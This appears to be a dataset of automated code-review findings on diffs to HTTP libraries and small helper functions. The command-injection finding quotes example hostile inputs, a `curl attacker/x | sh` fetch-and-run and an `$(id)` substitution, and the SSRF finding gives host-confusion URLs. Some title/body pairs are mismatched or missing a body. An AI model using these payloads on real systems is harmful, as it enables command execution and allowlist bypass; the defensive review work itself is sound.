findings.body: The code previously mapped HTTP DELETE requests to an 'delete' action, as documented in the repository's API configuration comments which explicitly state 'The three actions are distinct on purpose: an account may be allowed to push new tags without being allowed to delete existing ones.' The refactored code now maps all non-GET/HEAD requests to 'push', including DELETE requests, which breaks the documented three-action authorization model. This will cause DELETE operations to be authorized as 'push' operations, potentially allowing unauthorized deletions if an account has push but not delete permissions.

findings.title: Fallback for other methods changed from "pull" to "push"
findings.body: The original `default:` branch mapped any method outside the enumerated set (OPTIONS, TRACE, etc.) to `pull`. The new condition sends all of them to `push`, so a pull-only account issuing e.g. an OPTIONS/CORS preflight against a repository will now be rejected. If the stricter default is intentional it should be stated; otherwise enumerate the write methods explicitly rather than negating the read methods.

findings.title: Size guard clears the whole cache, including the entry just written
findings.body:
`get_tenant_fresh` writes `tenant` into `_CACHE` on line 10, then on line 11-12 calls `_CACHE.clear()` as soon as the cache exceeds 1000 entries. The clear runs after the insert, so the freshly fetched tenant is thrown away along with every other cached tenant: a caller that does `get_tenant_fresh(x)` followed by `get_tenant(x)` gets `None` back, and the next 1000 lookups all miss and re-fetch at once. Whatever the intent of the guard, wholesale eviction is almost certainly not it. Use a bounded eviction instead \u2014 e.g. pop the oldest entry (`collections.OrderedDict` + `popitem(last=False)`) or `functools.lru_cache`/an LRU dict with `maxsize=1000` \u2014 so the entry just stored survives and only one item is evicted per insert.

_Also raised by the security agent:_ Full-cache flush on overflow lets one caller evict all tenants

findings.title: No test exercises get_tenant_fresh or its cache eviction
findings.body: get_tenant_fresh fetches fresh data, writes it into _CACHE, and clears the entire cache once it exceeds 1000 entries. None of this is covered by a test in the diff: if _fetch were not called, if the cache were never updated, or if the eviction threshold/logic were wrong (e.g. off-by-one, or clearing too aggressively/never), nothing would fail. Add tests asserting that (a) the returned value matches _fetch's result, (b) _CACHE[tenant_id] is updated afterwards, and (c) the cache is cleared once the size exceeds 1000.

findings.title: README documents removed `--workers` flag

findings.body: The docstring states the function returns 'the total number of API calls this month as an integer', but the implementation now returns a dictionary mapping days to call counts. Either keep the total and add a separate `daily_usage` function, or rename this one, update the docstring, and update every call site.

findings.title: Behavior change to monthly_usage has no accompanying test
findings.body: monthly_usage now returns a dict keyed by day instead of a single integer total, but no test is included in this diff. If the function were reverted or broken (e.g. wrong grouping key, wrong aggregation), nothing in the current change set would catch it. Add a test asserting the new dict-shaped return value for a known set of rows.

findings.title: Renaming `page_size` to `limit` breaks keyword-argument callers
findings.body: `list_invoices` is a public-looking API function whose second parameter was renamed from `page_size` to `limit`. Any existing caller invoking `list_invoices(tenant_id, page_size=100)` will now raise `TypeError: list_invoices() got an unexpected keyword argument 'page_size'` at runtime — positional callers are unaffected, so this will slip through anything that only exercises the positional path. No callers were retrieved for this review, so I cannot confirm whether any use the keyword form; please grep for `page_size=` against this function. If external/other-module callers exist, either keep a deprecated `page_size=None` alias that maps onto `limit`, or update all call sites in the same change.

findings.title: Docstring still documents the old `page_size` parameter
findings.body:
The rename was applied to the signature (line 1) and the `_query` call (line 9) but not to the docstring, which still lists `page_size`. Callers reading the docs will pass a keyword argument that no longer exists. Update the Args entry to `limit`.

_Also raised by the docs agent:_ Docstring parameter name does not match signature

findings.title: Parameter rename to list_invoices has no visible test coverage
findings.body: list_invoices renamed its second parameter from page_size to limit, changing the public keyword-argument contract. If any caller invokes this function with page_size=... as a keyword argument, it will now raise a TypeError. No test file is included in this diff, so nothing would catch a caller relying on the old keyword name, nor verify the new parameter is correctly threaded through to _query.

findings.title: `from adapters import HTTPAdapter` is not package-relative
findings.body: Every other import in this module uses the explicit relative form (`from .utils import ...`, `from .packages.urllib3.poolmanager import PoolManager`). `from adapters import HTTPAdapter` resolves against `sys.path`, not the `requests` package, so on Python 3 (and on Python 2 with `absolute_import`) importing `requests.sessions` raises `ImportError` and the whole library fails to import. Change it to `from .adapters import HTTPAdapter`.

findings.title: TLS verify/cert arguments silently dropped in new request() path
findings.body:
The new `request()` signature still accepts `verify=None` and `cert=None` (lines 148-149), but the body never attaches them to the `Request` object and never passes them to `self.send(prep)` (line 167). `send()` (line 364) constructs a bare `HTTPAdapter()` with no arguments and calls `adapter.send(request)`, so there is no channel by which a caller's `verify=True`/`verify='/path/ca.pem'` or client `cert=` can reach the transport. Any caller that relies on `requests.Session().request(..., verify=True)` — or on a CA bundle path, or on mutual-TLS client certs — now gets whatever the adapter happens to default to, with no error and no warning. If the adapter defaults to unverified TLS this is a silent downgrade to an interceptable connection; even if it defaults to verified, explicitly-pinned CA bundles and client certificates are dropped.

Also dropped on the same path: `timeout` (line 141), which means requests to an attacker-controlled or unresponsive host can hang indefinitely, and `prefetch`/`config`. Thread `verify`, `cert` and `timeout` through to the adapter (e.g. `self.send(prep, verify=verify, cert=cert, timeout=timeout)`) rather than accepting and ignoring them.

findings.title: `_send_request` is deleted but still called by `old_request`
findings.body: The diff removes the `_send_request` method, but the surviving code path (`old_request`, kept at line 172) still ends with `return self._send_request(r, **args)` on line 292. Any call that reaches `old_request` now raises `AttributeError: 'Session' object has no attribute '_send_request'`. Either keep `_send_request` or delete `old_request` along with it.

findings.title: New `request()` accepts but silently ignores timeout/verify/cert/prefetch/config
findings.body: The new `request()` keeps the full public keyword signature (`timeout`, `proxies`, `return_response`, `config`, `prefetch`, `verify`, `cert`) but only copies `method`, `url`, `headers`, `files`, `data`, `params`, `auth`, `cookies`, `allow_redirects`, `proxies`, `hooks` onto the `Request` before calling `self.send(prep)`. Existing callers passing `timeout=`, `verify=False`, `cert=`, `prefetch=False` or `return_response=False` now get their argument accepted and discarded — a silent behaviour change (e.g. TLS verification and timeouts stop being honoured) rather than an error. Also note the session's own `self.headers`, `self.cookies`, `self.auth`, `self.params` and `self.config` are no longer merged into the request, and `allow_redirects` is stored on the request but nothing in `send()` performs redirect resolution, so `allow_redirects=True` no longer follows redirects. Either thread these through to `prepare()`/`send()` or drop them from the signature so callers fail loudly.

findings.title: close() docstring removed but contract not updated
findings.body: The `close()` method previously documented that it disposes of internal state and closes pooled connections. The new implementation is a no-op (`pass`), making the old docstring actively misleading to callers who rely on it to clean up resources. Either restore the implementation or update documentation to reflect that close() no longer does anything.

findings.title: close() is a no-op while send() builds a new adapter/PoolManager per request
findings.body: `close()` (used by `__exit__` on line 129) no longer disposes anything, and `init_poolmanager()`/`self.poolmanager` were removed from `__init__`, so the session holds no pooled connections to clear. Meanwhile `send()` instantiates a fresh `HTTPAdapter()` on every call (line 365), which creates a new connection pool per request and is never closed. The net effect is that connection pooling is gone and sockets accumulate until GC — the opposite of what the removed `PoolManager.clear()` guaranteed. Build the adapter once in `__init__` (or keep an adapter registry) and have `close()` clear it. Note also that the removal of `init_poolmanager()` and `self.poolmanager` breaks any subclass or caller that overrode/read them.

findings.title: Non-relative `import adapters` can resolve to an arbitrary sys.path module
findings.body: Every other import in this module is package-relative (`from .utils import ...`, `from .packages.urllib3.poolmanager import ...` on lines 18-19), but line 22 uses `from adapters import HTTPAdapter`. Under Python 3 (and Python 2 with `absolute_import`) this resolves against `sys.path`, not the `requests` package, so whichever top-level module named `adapters` is found first wins — including a file in the interpreter's working directory or script directory. Since `HTTPAdapter.send()` is now the sole transport for every request (line 366), a shadowing module gets full control of outbound HTTP, including TLS settings and credentials in the prepared request. Change this to `from .adapters import HTTPAdapter`.

findings.title: Behavior changes to close()/request()/send() are untested
findings.body: This diff removes the working close() implementation (which called self.poolmanager.clear()) and replaces it with `pass`, and rewrites request()/send() to build a Request, prepare it, and dispatch through a new HTTPAdapter.send() path instead of request.send(). No test file is included in this PR, and nothing shown demonstrates existing coverage that exercises Session.close(), Session.request(), or Session.send() against real behavior (e.g. verifying a request actually round-trips through HTTPAdapter, or that resources are still released on close()). If any of these changes are wrong — e.g. close() silently leaking connections, or send() breaking prepared-request handling — nothing here would fail.

findings.title: send() contract change not documented
findings.body: The `send()` method's documented contract states 'Send a given PreparedRequest' and previously called `request.send()` directly. The new implementation instantiates an HTTPAdapter and calls its send method instead. While the external behavior may be similar, the change in how the method works is not reflected in the docstring.

findings.title: cookies returns None on malformed Cookie header, breaking all callers
findings.body:
When `SimpleCookie.load()` raises (a malformed or hostile `Cookie:` header is entirely attacker-controlled and reachable on any request), `_cookies` is set to `None` and the property returns `None`. Every consumer then fails: `get_cookie` does `if name in self.request.cookies` → `TypeError: argument of type 'NoneType' is not iterable`, and `clear_all_cookies` does `self.request.cookies.iterkeys()` → `AttributeError: 'NoneType' object has no attribute 'iterkeys'`. The result is a 500 on any request with a bad cookie header, for any handler that reads a cookie (including secure-cookie/XSRF paths). The old code kept `self._cookies` as a (possibly partially loaded) `SimpleCookie` and merely called `clear_all_cookies()`, so the attribute always stayed dict-like. Restore that invariant, e.g. `self._cookies = Cookie.SimpleCookie()` in the `except` block.

_Also raised by the security agent:_ Malformed Cookie header makes request.cookies None, crashing consumers

findings.title: RequestHandler.cookies removed without a compatibility alias
Moved cookies property has no test, and its error path changed silently
findings.body: The cookies property was moved from web.RequestHandler to httpserver.HTTPRequest, and the exception-handling behavior changed: previously a parse failure called self.clear_all_cookies() (leaving _cookies as an empty SimpleCookie), now it sets self._cookies = None. This means get_cookie/clear_all_cookies would raise on malformed Cookie headers instead of degrading gracefully. There is no test in this diff exercising cookies, get_cookie, or clear_all_cookies against a malformed Cookie header, so this regression would not be caught by any test run.

findings.title: Missing .strip() makes boundary lookup fail for normal headers
findings.body:
`content_type.split(";")` yields segments that retain the whitespace that follows the separator, so for the canonical header `multipart/form-data; boundary=----WebKitFormBoundaryX` the second element is `" boundary=----WebKitFormBoundaryX"`. `field.partition("=")` then returns `k == " boundary"`, which never equals `"boundary"`, the loop finishes without breaking, and the `for ... else` branch logs "Invalid multipart/form-data" and drops the body. Every standard multipart upload would silently lose its files and fields — a regression against the previous `'boundary=' in content_type` substring test, which tolerated the space.

Strip each segment before partitioning:

    k, sep, v = field.strip().partition("=")

findings.title: No test covers multipart boundary parsing with non-last 'boundary' field
findings.body: The change fixes handling of Content-Type headers where 'boundary=' is not the last field (e.g. 'multipart/form-data; boundary=X; charset=Y'), but no test exercises this new parsing logic (splitting on ';' and using partition). If this logic regresses (e.g. reverts to the old substring-based approach, or breaks on quoted boundary values, or breaks the 'k == "boundary"' check with whitespace like '; boundary=X'), nothing in the current test suite would fail.

findings.title: get_host authority parsing can disagree with urlparse (host confusion)
findings.body:
`get_host` treats the authority as everything up to the first `/`, and then strips userinfo at the *first* `@`. RFC 3986 ends the authority at the first `/`, `?` **or** `#`, and takes userinfo up to the *last* `@`. That difference is observable:

- `http://google.com?@evil.com/` — line 92 splits on `/` leaving `google.com?@evil.com`, line 94 then strips `google.com?` as userinfo and returns host `evil.com`, while `urllib.parse.urlsplit` returns host `google.com`.
- `http://google.com#@evil.com/` behaves the same way.
- `http://a@b@c/` returns `b@c` rather than `c`.

Any caller that validates a URL against an allowlist with a standards-compliant parser and then hands the same string to urllib3 (`connection_from_url`, which resolves the target through `get_host`) will connect to a different host than the one it approved — a classic SSRF/allowlist-bypass primitive. Prefer delegating to `urlsplit` (or at minimum terminate the authority on `?` and `#` and use `rsplit('@', 1)` for userinfo).

The attacker-controlled entry point (the `url` string reaching `connection_from_url`) is not in this diff and no repository context was retrieved, so the severity depends on whether a caller does allowlist checks with another parser; the parser differential itself is demonstrable from these lines alone.

findings.title: LocationParseError message has an unsubstituted %s placeholder
findings.body: `raise LocationParseError("Failed to parse: %s")` never interpolates the URL, so the exception text a caller sees is the literal string `Failed to parse: %s` with no indication of which URL failed. Change it to `raise LocationParseError("Failed to parse: %s" % url)` (or include the original url argument, since `url` has already been reassigned by the split on line 97 and no longer holds the full input).

findings.title: LocationParseError message is incomplete
findings.body: The error message raised at line 100 uses a format string placeholder '%s' but does not provide the actual URL value to be substituted. This makes the error message unhelpful to users trying to debug parsing failures, as they will see 'Failed to parse: %s' literally rather than the actual problematic URL.

findings.title: get_host() docstring example contradicts behavior
findings.body: The docstring example shows `get_host('google.com:80')` returning `('http', 'google.com', 80)`, but the function's actual behavior contradicts this. When a URL without a scheme is passed, line 88 initializes `scheme = 'http'` as a default. However, the example suggests this is the expected return for a bare host:port input. The real issue is that the example is misleading about what the function does with schemeless URLs — it does accept them and defaults to 'http', but the documentation doesn't explain this behavior clearly.

findings.title: accept_encoding string check silently discards non-`str` string types
findings.body: The branch uses `isinstance(accept_encoding, str)`. On Python 2 a `unicode` value (e.g. from `from __future__ import unicode_literals` in caller code) is not a `str`, and on Python 3 a `bytes` value is not a `str`; in both cases the value falls through to the `else` branch and the caller's explicitly supplied encoding is silently replaced by `'gzip,deflate'`. Since `six` is already imported in this module, use `isinstance(accept_encoding, six.string_types)` (and handle bytes explicitly if needed) so a caller-provided encoding is honoured.

findings.title: New util.py functions added without visible test coverage
findings.body: The refactor introduces make_headers, get_host, and is_connection_dropped as new module-level functions in urllib3/util.py, but no test file is included in this diff. get_host in particular has non-trivial parsing logic (scheme/host/port/auth splitting, digit validation raising LocationParseError) that could silently break on edge cases (e.g., IPv6 hosts, malformed ports) without a test catching it. Since no repository context or existing test file was retrieved, it's unclear whether these were previously tested elsewhere before the refactor moved them here; if not, tests should be added alongside this move.

findings.title: No test exercises an invalid `direction` value
findings.body: The validation `if sort not in SORTABLE or direction not in DIRECTIONS` has two ways to raise ValueError, but only the sort-key branch is tested (`test_rejects_an_unknown_sort_key` passes a bad `sort` with the default `direction`). If the `direction not in DIRECTIONS` check were removed or broken (e.g. an interpolation of raw `direction` bypassing the allowlist), no test would catch it.

findings.title: No default branch: unknown `kind` now returns undefined, not a string
No test exercises the switch-based narrowing in describe()
findings.body: The behavior change (replacing unsafe casts with a switch/type narrowing) touches both the 'click' and 'key' branches, including a change in output format for 'click' (now includes y, previously did not appear to). No test file is present in the diff to confirm describe() still returns the expected string for each event kind, so a regression (e.g. wrong property access, fallthrough, or missing return) would not be caught.

findings.title: `HTTPMove.location` now a URL object, breaking documented string contract
findings.body:
Previously `self.location` was assigned the raw constructor argument (a string in the documented usage), and only the header value was passed through `URL(...)`. After this change `self.location` holds a `yarl.URL`. The documented contract (`docs/web_reference.rst`) states the attribute is "the location the response redirects to, **as the string it was constructed with**", and that application code compares it against configured strings and calls `str.startswith` on it. `yarl.URL` has no `startswith` method, so such callers will raise `AttributeError`, and `resp.location == "/login"` will silently become `False` for every caller doing string equality — a redirect-target check that quietly stops matching is worse than a crash.

If the goal is to avoid constructing `URL` twice, keep the public attribute a string: e.g. compute `url = URL(location)` locally, then `self.headers['Location'] = str(url)` and `self.location = location`. If exposing a `URL` is genuinely intended, it is a breaking API change that needs a deprecation path (e.g. a separate `url` attribute) and a docs update.

Note also that `URL(location)` may normalise/percent-encode the input, so even `str(self.location)` is not guaranteed to round-trip to the original argument.

_Also raised by the security agent:_ location attribute type change can silently defeat redirect allowlist checks

findings.title: location attribute type contradicts documentation
findings.body: The `HTTPMove.location` attribute is now assigned a `URL` object instead of the original string. However, the documentation in `docs/web_reference.rst` explicitly states it should be 'as the string it was constructed with', and describes application code comparing it against configured strings and passing it to `str.startswith`. This type change breaks the documented contract and would cause callers relying on the documented behaviour to fail.

findings.title: No test guards location attribute's documented string type
findings.body: self.location now stores a URL object instead of the original string, contradicting the documented contract ('as the string it was constructed with', per docs/web_reference.rst). There is no test in this diff that asserts the type or value of HTTPMove.location after construction, so this behavior change would pass silently through any existing test suite that doesn't already check this attribute directly.

findings.title: readany can return b"" before EOF after switching while to if
findings.body:
`_wait()` is documented to resolve not only on `feed_data()`/`feed_eof()` but also at the end of a chunk, when no new data has been added to the buffer — its docstring explicitly states that "a caller must re-check its condition after waking rather than assuming data arrived." The `while` loop was that re-check.

With `if`, a spurious/end-of-chunk wakeup falls straight through to `return self._read_nowait(-1)` with an empty buffer and `_eof` still false, so `readany()` returns `b""`. An empty return from `readany()` is the end-of-stream signal for every consumer (`async for chunk in resp.content`, manual `while True: chunk = await readany(); if not chunk: break`), so the body is silently truncated mid-response rather than raising or continuing to wait.

Restore the loop:

```python
while not self._buffer and not self._eof:
    await self._wait('readany')
```

_Also raised by the security agent:_ Single `if` around `_wait()` lets readany() return empty before EOF

findings.title: No test guards against spurious-wake regression from while->if change
findings.body: The change converts a `while` loop into a single `if` check before waiting for the waiter. Per the documented contract in `_wait` ("the waiter is also resolved at the end of a chunk, which can happen with no new data in the buffer, so a caller must re-check its condition after waking"), this method previously re-checked the condition in a loop to handle spurious/chunk-boundary wakeups. With the loop replaced by a single `if`, a spurious wake with an empty buffer and no EOF would fall through to `_read_nowait(-1)` and return empty data prematurely, violating the read contract. No test in the diff (or apparently in the existing suite, since none is added here) exercises the spurious-wake scenario, so this regression would not be caught.

findings.title: Import statement uses non-existent module path
findings.body:
The import on line 9 attempts to import `adapters` as a top-level module, but based on context (line 8 imports from `.packages.urllib3`), this module is part of a package structure where `adapters` is a submodule. The relative import syntax with a leading dot (`.adapters`) must be preserved for this code to function. The absolute import `from adapters import HTTPAdapter` will fail at runtime with ModuleNotFoundError because no top-level `adapters` module exists in the Python path.

_Also raised by the security agent:_ Non-relative `import adapters` allows module shadowing via sys.path

findings.title: Implicit relative import breaks `import requests` on Python 3
findings.body: `from adapters import HTTPAdapter` is an implicit relative import. Implicit relative imports were removed in Python 3 (PEP 328), so this resolves as an absolute import of a top-level module named `adapters`, which does not exist — importing `requests.sessions` (and therefore `requests` itself) will raise `ModuleNotFoundError`/`ImportError` at import time. Even on Python 2 it would only work by accident and would shadow/be shadowed by any top-level `adapters` module on `sys.path`. Restore `from .adapters import HTTPAdapter`.

findings.title: No test would catch the broken import change
findings.body: Changing `from .adapters import HTTPAdapter` to `from adapters import HTTPAdapter` converts a package-relative import into an absolute import, which will fail with ImportError as soon as `requests.sessions` is imported as part of the `requests` package (since there is no top-level `adapters` module outside the package). No test file is included in this diff, so if this change is wrong, nothing would fail until some test or user imports `requests` at all — and if the surrounding test suite doesn't import `requests.sessions` (or the whole package) as part of collection, even that wouldn't surface it.

findings.title: get_cookie raises TypeError when request.cookies is None
findings.body:
`self.request.cookies` is documented to return `None` when the Cookie header is present but cannot be parsed (see `tornado/httpserver.py`, where the property returns `None` if `self._cookies is None`). With the `is not None` guard removed, `name in self.request.cookies` evaluates `name in None`, which raises `TypeError: argument of type 'NoneType' is not iterable` instead of returning `default`. Any request with a malformed Cookie header would turn a cookie read into a 500. Restore the guard: `if self.request.cookies is not None and name in self.request.cookies:`.

_Also raised by the security agent:_ Removed None guard lets a malformed Cookie header crash every handler

findings.title: get_cookie docstring misleads when cookies cannot be parsed
findings.body: The docstring states "Gets the value of the cookie with the given name, else default." This implies the function always returns either the cookie value or the default. However, the code now calls `name in self.request.cookies` without checking if `self.request.cookies` is None first. Per the `request.cookies` contract (visible in httpserver.py), it is set to None when the Cookie header is present but cannot be parsed. When cookies is None, the `in` operator will raise a TypeError, not return the default. The docstring must clarify this behavior or the check must be restored.

findings.title: No test covers get_cookie with cookies=None
findings.body: get_cookie now calls `name in self.request.cookies` without checking for None first. Per tornado/httpserver.py's docstring, `cookies` is explicitly set to None when the Cookie header is present but unparseable. If this behavior change introduces a TypeError in that case, no test in the repository (none included in this diff) would catch it.

findings.title: Dropping .strip() breaks multipart boundary detection
findings.body:
`content_type.split(";")` yields parameter segments that keep the separator's surrounding whitespace, e.g. `"multipart/form-data; boundary=----abc"` splits into `["multipart/form-data", " boundary=----abc"]`. Previously `field.strip().partition("=")` removed that leading space so `k == "boundary"` matched; with `field.partition("=")` the key is `" boundary"` and the comparison on line 5 never succeeds. The result is that `_parse_mime_body` is never called for the overwhelmingly common `; boundary=` form, so multipart bodies (file uploads, form fields) are silently discarded with no error raised. Restore the `.strip()` (or compare `k.strip() == "boundary"`).

_Also raised by the security agent:_ Dropping .strip() breaks boundary detection; attacker steers multipart parsing

findings.title: Removed .strip() before partition, no test covers whitespace-prefixed boundary field
findings.body: The change removes field.strip() before partitioning on '='. Content-Type headers commonly look like 'multipart/form-data; boundary=xyz', where splitting on ';' yields fields like ' boundary=xyz' with a leading space. Without stripping, k becomes ' boundary' (with leading space), which will never equal 'boundary' in the comparison on the next line, so the boundary will not be found and multipart bodies will silently fail to parse. There's no test in this diff exercising this code path with a leading-space boundary field, so this regression would not be caught.

findings.title: Parse error message has format placeholder but no argument
findings.body:
The error message on line 7 contains the format placeholder '%s' but no longer passes the `url` variable to fill it. This means the actual error message will display the literal text "Failed to parse: %s" instead of "Failed to parse: [the url that failed]".

Either restore the argument: `"Failed to parse: %s" % url`, or remove the placeholder and use `"Failed to parse"` alone.

findings.title: Malformed error message change lacks test coverage to catch the regression
findings.body: The change removes the '% url' argument from the format string, leaving a literal '%s' in the raised message and, more importantly, if this string is ever used with formatting it would raise a TypeError instead of LocationParseError. There is no test in this diff exercising the invalid-port parsing path, so nothing would fail even though the error message content is now wrong (and the underlying error-formatting bug, if any, would go unnoticed).

findings.title: Unsubstituted %s placeholder in LocationParseError message
findings.body: The format argument was removed but the `%s` placeholder was left in the string, so the raised exception reads literally `Failed to parse: %s` and no longer identifies which URL failed to parse. Anyone debugging a bad host:port will get a message with zero diagnostic content, and log-scraping/tests that match on the parsed URL will break. Either restore `% url` or remove the placeholder from the literal (e.g. `"Failed to parse URL"`), preferably the former since the offending value is the whole point of the message.

findings.title: Command injection via shell=True with interpolated arguments
findings.body:
`create_archive` interpolates `name` and `directory` directly into a shell command string and executes it with `shell=True`. Any shell metacharacter in either value escapes the intended `tar` invocation — e.g. `directory="/tmp; curl attacker/x | sh"` or `name="a$(id)"` — yielding arbitrary command execution with the process's privileges.

Fix by dropping the shell and passing an argument list, exactly as `list_exports` on line 5 already does:

```python
subprocess.run(["tar", "-czf", f"/exports/{name}.tar.gz", directory], check=True)
```

Separately, `name` is also concatenated into the output path, so a value containing `../` writes the archive outside `/exports/`; validate `name` against a strict allowlist (e.g. `[A-Za-z0-9_-]+`) before use.

findings.title: Unquoted interpolation into shell=True breaks on spaces/metacharacters
findings.body: `cmd` is built with an f-string and executed with `shell=True`, so `name` and `directory` are subject to shell word-splitting and glob/metacharacter expansion. An ordinary directory like `/data/my exports` becomes two arguments to `tar`, producing a wrong archive or a `CalledProcessError`; a `name` containing `;`, `$(...)`, `&&` or a backtick executes additional commands. The sibling `list_exports` on line 5 already uses the correct form. Pass an argument list and drop `shell=True`: `subprocess.run(["tar", "-czf", f"/exports/{name}.tar.gz", directory], check=True)`, and validate that `name` contains no path separators so it cannot escape `/exports/`.

findings.title: No test coverage for create_archive's shell command construction
findings.body: create_archive builds a shell command via string interpolation of `name` and `directory` and executes it with shell=True. There is no test file in this diff, so nothing would catch a regression here — e.g. if `name` or `directory` contained shell metacharacters, or if the tar flags/paths were changed incorrectly, no test would fail. Add a test that exercises create_archive with inputs containing special characters and asserts on the resulting command or subprocess call behavior (or on validation/escaping logic if added).

findings.title: Public function `create_archive` lacks contract documentation
findings.body: The `create_archive` function is a new public API (not prefixed with `_`) that accepts parameters which directly influence a shell command. A caller needs to know: what values are safe to pass for `name` and `directory`, whether they will be validated, and what the return value contains. The current signature and name do not make this clear. Add a docstring documenting the expected parameter formats and any constraints, so callers understand the contract.

findings.title: dashboardCors allows any origin with credentials enabled
findings.body:
`dashboardCors` sets `origin: "*"` together with `credentials: true`, while the existing export two lines above restricts to `ALLOWED`. Any route mounted with this middleware will emit a permissive `Access-Control-Allow-Origin` for arbitrary attacker-controlled `Origin` headers.

Two concrete consequences:

1. If this middleware (or anything downstream of it, e.g. a proxy or a later `cors()` layer) reflects the request `Origin` rather than emitting a literal `*`, any website a logged-in user visits can issue credentialed cross-origin requests to the dashboard API and read the responses — full session-riding read access to dashboard data. Note that the `cors` package emits a literal `*` for `origin: "*"`, and browsers reject `*` with credentials, so the credentialed path may fail in practice; the `credentials: true` flag signals the intended behaviour is credentialed access, which makes a later "fix" to reflect the origin very likely.
2. Independently of credentials, `*` lets any origin read responses from endpoints that are authorised by something other than cookies — network position, an internal-only deployment, or an `Authorization` header the browser is not asked to supply — turning an internal dashboard API into a publicly readable one.

Fix: reuse the `ALLOWED` allowlist (or an explicit dashboard-specific list of origins) instead of `"*"`. If the dashboard genuinely needs no credentials, drop `credentials: true`; wildcard plus credentials is never a valid combination.
